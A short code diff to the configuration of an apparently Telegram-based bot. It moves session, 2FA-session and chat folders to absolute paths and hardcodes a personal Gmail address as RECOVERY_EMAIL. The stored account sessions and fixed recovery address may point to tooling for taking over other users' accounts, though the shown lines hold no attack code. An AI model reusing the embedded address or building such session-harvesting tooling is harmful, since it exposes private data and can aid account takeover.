@@ -3,6 +3,9 @@ MAIN_BOT_TOKEN = os.environ.get("MAIN_BOT_TOKEN")
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 
-SESSION_FOLDER = "data/sessions"
-SESSION_2FA_FOLDER = "data/sessions_2fa"
-CHAT_FOLDER = "data/chats"
+BASE_DATA_PATH = "/app/data"
+SESSION_FOLDER = "/app/data/sessions"
+MY_SESSION_PATH = "/app/data/sessions/my_account"
+SESSION_2FA_FOLDER = "/app/data/sessions_2fa"
+CHAT_FOLDER = "/app/data/chats"
+RECOVERY_EMAIL = "balamutdans@gmail.com"
